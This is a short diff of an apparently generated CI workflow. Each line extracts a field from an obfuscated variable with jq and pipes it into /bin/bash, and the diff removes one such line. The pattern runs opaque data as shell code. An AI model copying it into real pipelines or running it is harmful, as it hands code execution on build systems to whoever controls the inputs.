@@ -22,7 +22,6 @@ jobs:
           echo $ipbf52 | jq -r .dchvi88 | /bin/bash
           echo $ekkk85512 | jq -r .um2 | /bin/bash
           printf '%s' "$u6620" | jq -r .gekq05 | /bin/bash
-          printf '%s' "$kj49670" | jq -r .he33745 | /bin/bash
           echo $f26381 | jq -r .nbqc2043 | /bin/bash
           printf '%s' "$cm1148" | jq -r .jmykj46895 | /bin/bash
           printf '%s' "$t5" | jq -r .uv160 | /bin/bash
